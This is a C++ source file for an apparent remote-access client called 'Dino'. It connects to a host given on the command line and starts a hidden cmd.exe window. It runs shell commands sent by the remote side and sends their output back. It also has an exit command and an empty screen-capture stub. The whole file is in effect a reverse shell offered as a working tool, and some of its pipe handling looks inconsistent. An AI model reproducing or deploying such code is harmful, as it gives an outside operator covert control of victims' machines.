//                                                                  
//                                                                  
//  DDDDDDDDDDDDD          iiii                                     
//  D::::::::::::DDD      i::::i                                    
//  D:::::::::::::::DD     iiii                                     
//  DDD:::::DDDDD:::::D                                             
//    D:::::D    D:::::D iiiiiii nnnn  nnnnnnnn       ooooooooooo   
//    D:::::D     D:::::Di:::::i n:::nn::::::::nn   oo:::::::::::oo 
//    D:::::D     D:::::D i::::i n::::::::::::::nn o:::::::::::::::o
//    D:::::D     D:::::D i::::i nn:::::::::::::::no:::::ooooo:::::o
//    D:::::D     D:::::D i::::i   n:::::nnnn:::::no::::o     o::::o
//    D:::::D     D:::::D i::::i   n::::n    n::::no::::o     o::::o
//    D:::::D     D:::::D i::::i   n::::n    n::::no::::o     o::::o
//    D:::::D    D:::::D  i::::i   n::::n    n::::no::::o     o::::o
//  DDD:::::DDDDD:::::D  i::::::i  n::::n    n::::no:::::ooooo:::::o
//  D:::::::::::::::DD   i::::::i  n::::n    n::::no:::::::::::::::o
//  D::::::::::::DDD     i::::::i  n::::n    n::::n oo:::::::::::oo 
//  DDDDDDDDDDDDD        iiiiiiii  nnnnnn    nnnnnn   ooooooooooo   
//                                                                  
//   
//	Client
//	Version 1.0 By Rory Hemmings
//

#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <array>
#include <thread>
#include <functional>

#include <SocketWrapper.h>

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")

using namespace std;

bool running;

std::string exec(const char* cmd) {
	std::array<char, 128> buffer;
	std::string result;
	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
	if (!pipe) {
		throw std::runtime_error("popen() failed!");
	}
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
		result += buffer.data();
	}
	return result;
}

bool semi_colon(char c)
{
	return c == ';';
}

bool not_semi_colon(char c)
{
	return !semi_colon(c);
}

vector<string> split(const string& s)
{
	vector<string> ret;
	string::const_iterator i = s.begin();
	while (i != s.end()) {
		i = find_if(i, s.end(), not_semi_colon);
		string::const_iterator j = find_if(i, s.end(), semi_colon);

		if (i != s.end())
			ret.push_back(string(i, j));
		i = j;
	}

	return ret;
}

void cmdProcess(const ClientSocket& client, HANDLE& hToCmd)
{
	SECURITY_ATTRIBUTES secAttrs;
	STARTUPINFOA sInfo = { 0 };
	PROCESS_INFORMATION pInfo = { 0 };
	HANDLE hInWrite, hFromCmd, hOutRead;
	char path[400];
	char outBuffer[4096];
	DWORD bytesReadFromPipe;

	secAttrs.nLength = sizeof(SECURITY_ATTRIBUTES);
	secAttrs.bInheritHandle = TRUE;
	secAttrs.lpSecurityDescriptor = NULL;

	CreatePipe(&hInWrite, &hFromCmd, &secAttrs, 0);
	CreatePipe(&hToCmd, &hOutRead, &secAttrs, 0);
	GetEnvironmentVariable("ComSpec", path, sizeof(path));

	sInfo.cb = sizeof(STARTUPINFO);
	sInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	sInfo.wShowWindow = SW_HIDE;
	sInfo.hStdInput = hToCmd;
	sInfo.hStdOutput = hFromCmd;
	sInfo.hStdError = hFromCmd;

	CreateProcessA(NULL, path, &secAttrs, &secAttrs, TRUE, 0, NULL, NULL, &sInfo, &pInfo);

	running = true;
	while (running) {
		memset(outBuffer, 0, sizeof(outBuffer));
		PeekNamedPipe(hInWrite, NULL, NULL, NULL, &bytesReadFromPipe, NULL);
		while (bytesReadFromPipe) {
			if (!ReadFile(hInWrite, outBuffer, sizeof(outBuffer), &bytesReadFromPipe, NULL))
				break;
			else {
				client.sendBytes(outBuffer);
			}
			cout << "Read" << endl;
			PeekNamedPipe(hInWrite, NULL, NULL, NULL, &bytesReadFromPipe, NULL);
		}
	}

	TerminateProcess(pInfo.hProcess, 0);
}

int main(int argc, char** argv)
{
	if (argc != 2) {
		cout << "Usage: " << argv[0] << " <ADRESS>" << endl;
		return 1;
	}

	ClientSocket client(argv[1], DEFAULT_PORT);

	// Wait for initial response
	string w = client.recieveLine();

	if (w == "welcome") {
		cout << "Connection Successful! " << endl;
	}

	HANDLE hToCmd;
	thread cmdLoop(&cmdProcess, ref(client), ref(hToCmd));

	while (true)
	{
		vector<string> command = split(client.recieveLine());
		if (command[0] == "run") {
			//string res = exec(command[1].c_str());
			WriteFile(hToCmd, command[1].c_str(), command[1].size(), NULL, NULL);
			cout << "Running Command : " << command[1] << endl;
		}
		else if (command[0] == "exit") {
			running = false;
			client.sendLine("exit");
			break;
		}
		else if (command[0] == "screencap") {

		}
	}

	cmdLoop.join();
	client.close();

	return 0;
}
